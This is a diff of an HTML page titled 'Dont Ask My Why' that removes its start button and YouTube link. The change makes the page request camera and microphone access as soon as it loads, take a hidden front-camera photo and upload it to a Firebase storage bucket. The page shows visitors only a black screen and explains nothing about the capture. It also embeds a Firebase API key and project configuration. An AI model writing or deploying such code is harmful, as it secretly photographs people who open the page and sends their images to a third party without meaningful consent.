@@ -5,13 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dont Ask My Why</title>
     <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
-    
+
     <script type="module">
         // Import Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
-        // Firebase configuration object
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
             authDomain: "html-7fd9b.firebaseapp.com",
@@ -21,40 +21,30 @@
             appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
         };
 
-        // Initialize Firebase and set up storage
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
+        // Function to upload image to Firebase
         function uploadImage(imageData) {
-            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Set the path in Firebase Storage
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png');
             uploadString(storageRef, imageData, 'data_url')
                 .then(() => {
-                    console.log('Uploaded a blob or file successfully!');
+                    console.log('Uploaded a blob or file!');
                 })
                 .catch((error) => {
                     console.error('Error uploading image:', error);
                 });
         }
 
-        function requestPermissions() {
-            return navigator.mediaDevices.getUserMedia({ audio: true }) // Request microphone access
-                .then(micStream => {
-                    console.log('Microphone access granted.');
-                    return micStream; // Return microphone stream
-                })
-                .catch(error => {
-                    console.error('Error accessing microphone:', error);
-                    throw error; // Propagate the error
-                });
-        }
-
-        async function setupCamera(micStream) {
-            const video = document.createElement('video'); // Create a video element for streaming
-            const canvas = document.createElement('canvas'); // Create a canvas element for image capture
-            const context = canvas.getContext('2d'); // Get the drawing context from the canvas
-
+        // Request microphone and camera permissions
+        async function requestPermissions() {
             try {
-                // Request camera access with flash turned off
+                // Request microphone access
+                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                console.log('Microphone access granted.');
+
+                // Request camera access after microphone access is granted
                 const camStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: { ideal: "user" }, // Use front camera
@@ -65,40 +55,38 @@
                 });
                 console.log('Camera access granted.');
 
-                // Assign the camera stream to the video element
+                // Capture image after both permissions are granted
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
                 video.srcObject = camStream;
+
                 video.onloadedmetadata = () => {
-                    video.play(); // Play the video stream when metadata is loaded
-                    canvas.width = 1920; // Set canvas width
-                    canvas.height = 1080; // Set canvas height
-                    // Capture image from video stream
-                    captureImage(context, video, micStream, camStream);
+                    video.play();
+                    canvas.width = 1920;
+                    canvas.height = 1080;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    uploadImage(imageData); // Upload the captured image to Firebase
                 };
-            } catch (err) {
-                console.error('Permissions were not granted:', err);
+
+                // Stop the video and microphone streams after capturing the image
+                stopVideo(micStream);
+                stopVideo(camStream);
+            } catch (error) {
+                console.error('Error accessing microphone or camera:', error);
             }
         }
 
-        function captureImage(context, video, micStream, camStream) {
-            context.drawImage(video, 0, 0, context.canvas.width, context.canvas.height);
-            const imageData = context.canvas.toDataURL('image/png'); // Convert canvas to image data URL
-            uploadImage(imageData); // Upload the captured image to Firebase
-            stopVideo(micStream); // Stop the microphone stream to conserve resources
-            stopVideo(camStream); // Stop the camera stream after capture
-        }
-
+        // Function to stop video stream
         function stopVideo(stream) {
-            const tracks = stream.getTracks(); // Get all tracks from the stream
-            tracks.forEach(track => track.stop()); // Stop each track to release resources
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
         }
 
-        // Event listener for the button click to initiate permission requests
+        // Automatically request permissions on page load
         window.addEventListener('load', () => {
-            const button = document.getElementById('startButton');
-            button.addEventListener('click', async () => {
-                const micStream = await requestPermissions(); // Get microphone permissions first
-                await setupCamera(micStream); // Setup camera afterwards
-            });
+            requestPermissions();
         });
     </script>
 
@@ -106,7 +94,7 @@
         body {
             margin: 0;
             padding: 0;
-            background-color: #000; /* Set black background */
+            background-color: #000; /* Black background */
             color: #fff; /* Optional: Text color for visibility */
             font-family: Arial, sans-serif; /* Font styling */
             display: flex; /* Flexbox for centering */
@@ -117,34 +105,11 @@
         }
 
         video, canvas {
-            display: none; /* Hide video and canvas elements from display */
-        }
-
-        /* Button styling */
-        .button {
-            background-color: transparent; /* Transparent background */
-            border: 3px solid white; /* White border */
-            color: white; /* White text */
-            padding: 20px 40px; /* Increased padding for a larger button */
-            text-align: center; /* Center text */
-            text-decoration: none; /* Remove underline */
-            display: inline-block; /* Inline block for button */
-            font-size: 24px; /* Increased font size */
-            margin: 20px; /* Margin around button */
-            cursor: pointer; /* Pointer cursor on hover */
-            border-radius: 5px; /* Rounded corners */
-            transition: background-color 0.3s, color 0.3s; /* Transition effects */
-        }
-
-        .button:hover {
-            background-color: white; /* Background color on hover */
-            color: black; /* Text color on hover */
+            display: none; /* Hide video and canvas elements */
         }
     </style>
 </head>
 <body>
     <h1 style="display: none;">This is a hidden heading</h1> <!-- Example of hidden content -->
-    <button id="startButton" class="button">Start Permissions</button> <!-- Button that starts permission requests -->
-    <a href="https://www.youtube.com/watch?v=xvFZjo5PgG0" class="button">Button</a> <!-- Button that redirects to YouTube -->
 </body>
 </html>
